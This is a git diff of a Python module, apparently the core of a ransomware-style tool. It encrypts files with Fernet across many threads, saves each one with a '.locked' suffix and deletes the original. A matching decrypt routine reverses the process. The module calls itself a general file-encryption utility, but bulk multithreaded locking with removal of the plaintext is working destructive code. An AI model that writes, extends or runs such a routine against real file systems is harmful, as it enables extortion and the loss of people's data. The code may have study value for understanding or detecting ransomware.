@@ -25,46 +25,91 @@
 # LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 # SOFTWARE.
+"""Provides functionality to encrypt and decrypt files using Fernet symmetric encryption."""
 
-from concurrent.futures import ThreadPoolExecutor
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from io import DEFAULT_BUFFER_SIZE
+import os
 from pathlib import Path
+import sys
 
 from cryptography.fernet import Fernet
 
-
-def gen_key() -> bytes:
-    return Fernet.generate_key()
+MAX_WORKERS = min(32, (os.cpu_count() or 1) * 4)
 
 
-def get_fernet(key: str | bytes) -> Fernet:
-    if isinstance(key, str):
-        key = key.encode()
-    return Fernet(key)
+def encrypt_stream(
+    fernet: Fernet, file: Path, suffix: str = ".locked", buff: int = DEFAULT_BUFFER_SIZE
+) -> None:
+    """Encrypts a file stream and saves it with a new name.
 
-
-def encrypt_bytes(fernet: Fernet, data: bytes) -> bytes:
-    return fernet.encrypt(data)
-
-
-def decrypt_bytes(fernet: Fernet, data: bytes) -> bytes:
-    return fernet.decrypt(data)
-
-
-def write_encrypted(file: Path, data: bytes, suffix: str = ".locked") -> None:
-    file.write_bytes(data)
-    if not file.name.endswith(suffix):
-        file.rename(file.with_name(file.name + suffix))
-
-
-def encrypt_file(fernet: Fernet, file: Path) -> None:
-    file_bytes = file.read_bytes()
-    encrypted_bytes = encrypt_bytes(fernet, file_bytes)
+    Args:
+        fernet (Fernet): The Fernet instance used for encryption.
+        file (Path): The file path to be encrypted.
+        suffix (str, optional): The suffix to be added to the encrypted file's name. Defaults to ".locked".
+        buff (int, optional): The buffer size for reading chunks of the file. Defaults to DEFAULT_BUFFER_SIZE.
+    """
+    enc_file = file.parent / (file.name + suffix)
     try:
-        write_encrypted(file, encrypted_bytes)
+        with open(file, "rb") as f_in, open(enc_file, "wb") as f_out:
+            while True:
+                chunk = f_in.read(buff)
+                if not chunk:
+                    break  # EOF
+                enc = fernet.encrypt(chunk)
+                f_out.write(len(enc).to_bytes(4, sys.byteorder))
+                f_out.write(enc)
+        file.unlink()
     except (PermissionError, FileNotFoundError, IsADirectoryError) as e:
         print(f"Skipping: {file}: {e}")
 
 
-def encrypt_files(fernet: Fernet, files: list[Path]) -> None:
-    with ThreadPoolExecutor(max_workers=8) as executor:
-        executor.map(lambda f: encrypt_file(fernet, f), files)  # type: ignore
+def decrypt_stream(fernet: Fernet, file: Path) -> None:
+    """Decrypts an encrypted file stream.
+
+    Args:
+        fernet (Fernet): The Fernet instance used for decryption.
+        file (Path): The encrypted file path to be decrypted.
+
+    Raises:
+        ValueError: If the encrypted file is corrupted.
+    """
+    decp_file = file.with_name(file.name.removesuffix(".locked"))
+    try:
+        with open(file, "rb") as f_in, open(decp_file, "wb") as f_out:
+            while True:
+                size_bytes = f_in.read(4)
+                if not size_bytes:
+                    break  # EOF
+
+                size = int.from_bytes(size_bytes, sys.byteorder)
+                enc_chunck = f_in.read(size)
+                if len(enc_chunck) != size:
+                    raise ValueError(
+                        f"Corrupted File: expected {size} bytes, got {len(enc_chunck)}"
+                    )
+
+                plain_chunck = fernet.decrypt(enc_chunck)
+                f_out.write(plain_chunck)
+        file.unlink()
+    except (PermissionError, FileNotFoundError, IsADirectoryError) as e:
+        print(f"Skipping: {file}: {e}")
+
+
+def parse_files(fernet: Fernet, files: list[Path], decrypt: bool = False) -> None:
+    """
+    Encrypts or decrypts a list of files concurrently.
+
+    Args:
+        fernet (Fernet): The Fernet instance used for encryption or decryption.
+        files (list[Path]): The list of file paths to be processed.
+        decrypt (bool, optional): If True, the files will be decrypted. Defaults to False (encrypt).
+    """
+    handler = decrypt_stream if decrypt else encrypt_stream
+    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+        futures = [executor.submit(handler, fernet, file) for file in files]
+        for future in as_completed(futures):
+            try:
+                future.result()
+            except Exception as e:
+                print(f"Error: {e}")
